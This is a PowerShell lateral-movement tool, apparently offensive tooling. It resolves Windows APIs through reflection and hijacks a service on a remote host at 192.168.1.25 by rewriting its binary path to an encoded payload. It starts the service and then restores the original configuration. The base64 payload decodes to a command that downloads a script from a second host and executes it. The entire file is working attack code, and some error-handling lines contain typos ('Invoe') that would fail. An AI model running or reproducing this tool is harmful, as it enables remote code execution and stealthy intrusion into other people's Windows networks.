<#
    Powershell implementation of the popular SCExec based lateral movement method
#>
function ResolveAddr {
    Param([string]$lib_name, [string]$func_name)

    $sys = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals("System.dll")})
    $unsf = $sys.GetType("Microsoft.Win32.UnsafeNativeMethods")
    $GMH = $unsf.GetMethod("GetModuleHandle")
    $tmp_arr = @()
    $unsf.GetMethods() | ForEach-Object { If ($_.Name -eq "GetProcAddress") { $tmp_arr += $_}}
    $libh = $GMH.Invoke($null, @($lib_name))
    $faddr = $tmp_arr[0].Invoke($null, @($libh, $func_name))
    return $faddr
}


function PrepareAPI {
    Param(
      [IntPtr]$faddr,
      [Type]$ret_type,
      [Type[]]$arg_types
    )

    $asm = New-Object System.Reflection.AssemblyName('MyRefl')
    $domain = [AppDomain]::CurrentDomain
    $asm_build = $domain.DefineDynamicAssembly($asm, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $mod_build = $asm_build.DefineDynamicModule('MyMod', $false)
    $type_build = $mod_build.DefineType('MyDeleg', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $const_build = $type_build.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $arg_types)
    $const_build.SetImplementationFlags('Runtime, Managed')
    $method_build = $type_build.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ret_type, $arg_types)
    $method_build.SetImplementationFlags('Runtime, Managed')
    $dlg_type = $type_build.CreateType()
    $myFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($faddr, $dlg_type)
    return $myFunc
}


function OpenService {
    Param(
        [string]$target,
        [string]$service
    )

    $serve_all_acc = 0xF01FF
    $sc_mngr_acc = 0xF003F
    $sc_manager = PrepareAPI (ResolveAddr "advapi32.dll" "OpenSCManagerA") ([IntPtr]) @([String], [String], [int])
    $op_service = PrepareAPI (ResolveAddr "advapi32.dll" "OpenServiceA") ([IntPtr]) @([IntPtr], [string], [UInt32])

    Write-Host "[+] Opening ServiceControlManger on host: $target"
    [IntPtr]$scmngr_handle = $sc_manager.Invoke($target, "ServicesActive", $sc_mngr_acc)
    if ($scmngr_handle -eq [IntPtr]::Zero) {
        $r = $GetLastError.Invoke()
        Write-Host "[!] Failed opening ServiceControlManager, status: $r"
        exit
    }

    Write-Host "[+] Opening handle to service: $service"
    [IntPtr]$svc_handle = $op_service.Invoke($scmngr_handle, $service, $serve_all_acc)
    if ($svc_handle -eq [IntPtr]::Zero) {
        $r = $GetLastError.Invoke()
        Write-Host "[!] Failed opening handle to service: $service , status: $r"
        exit
    }
    return $svc_handle
}


function SaveConfig {

    Param(
        [IntPtr]$svc_handle,
        [Switch]$debug
    )

    $query_svc = PrepareAPI (ResolveAddr "advapi32.dll" "QueryServiceConfigA") ([bool]) @([IntPtr], [IntPtr], [uint32], [uint32].MakeByRefType())

    $scConfigPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1024)
    [uint32]$bytesNeeded = 0
    if (-not $query_svc.Invoke($svc_handle, $scConfigPtr, 1024, [ref]$bytesNeeded)) 
    {
        $r = $GetLastError.Invoe()
        Write-Host "[!] Failed quuerying service config: $r"
    }
    
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($scConfigPtr)
    $scConfigPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($bytesNeeded)

    if (-not $query_svc.Invoke($svc_handle, $scConfigPtr, $bytesNeeded, [ref]$bytesNeeded))
    {
        $r = $GetLastError.Invoe()
        Write-Host "[!] Failed quuerying service config: $r"
    }

    $byteArray = New-Object byte[] $bytesNeeded
    [System.Runtime.InteropServices.Marshal]::Copy($scConfigPtr, $byteArray, 0, $bytesNeeded)

    Write-Host "[+] Extracting old service configuration"
    $global:serviceType = [BitConverter]::ToUInt32($byteArray, 0)
    $global:startType = [BitConverter]::ToUInt32($byteArray, 4)
    $global:errCtrl = [BitConverter]::ToUInt32($byteArray, 8)
    $global:binPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi([IntPtr]($scConfigPtr.ToInt64() + 0x40))
    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($scConfigPtr)
    if ($Debug) {
        Write-Host "[+] Dumping the whole service config buffer"
        for ($i = 0; $i -lt $byteArray.Length; $i += 16) {
            $chunk = $byteArray[$i..([Math]::Min($i + 15, $byteArray.Length - 1))]
            $offset = "{0:X8}" -f $i
            $hex = ($chunk | ForEach-Object { "{0:X2}" -f $_ }) -join " "
            $ascii = ($chunk | ForEach-Object { if ($_ -ge 32 -and $_ -le 126) { [char]$_ } else { '.' } }) -join ""
            Write-Host "$offset  $hex  $ascii"
        }
    }
}


function OverWrite {
    Param(
        [IntPtr]$svc_handle,
        [string]$payload,
        [Switch]$restore
    )

    $change_cfg = PrepareAPI (ResolveAddr "advapi32.dll" "ChangeServiceConfigW") ([bool]) @([IntPtr], [UInt32], [UInt32], [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr])

    if ($restore) {
        Write-Host "[+] Reverting the service config to original"
        $binPathPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($binPath)
        $res = $change_cfg.Invoke($svc_handle, $serviceType, $startType, $errCtrl, $binPathPtr, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
        if (-not $res) {
            $r = $GetLastError.Invoke()
            Write-Host "[!] Failed changing service config: $r"
            return
        }
    }
    else {
        Write-Host "[+] Changing the binPath to: $payload"
        $payloadPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($payload)
        $res = $change_cfg.Invoke($svc_handle, [uint32]::MaxValue, [uint32]0x00000003, [uint32]0x00000000, $payloadPtr, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero)
        if (-not $res) {
            $r = $GetLastError.Invoke()
            Write-Host "[!] Failed changing service config: $r"
            exit
        }
    }
}



$start_svc = PrepareAPI (ResolveAddr "advapi32.dll" "StartServiceA") ([bool]) @([IntPtr], [int], [string[]])
$GetLastError = PrepareAPI (ResolveAddr "kernel32.dll" "GetLastError") ([UInt32]) @()


$target = "192.168.1.25"
$service = "SensorService"
$payload = "C:\windows\system32\cmd.exe /c powershell /enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyADEALwBoAG8AbABsAG8AdwAuAHAAcwAxACIAKQB8AEkARQBYAA=="

[IntPtr]$svc_handle = OpenService $target $service
SaveConfig $svc_handle #-debug

OverWrite $svc_handle $payload
Write-Host "[+] Starting the service"
if (-not $start_svc.Invoke($svc_handle, 0, $null)) {
    $r = $GetLastError.Invoke()
    if ($r -ne 1053) {
        Write-Host "[!] Failed starting the service: $r"
    }
}
start-sleep -seconds 5
OverWrite $svc_handle "" -restore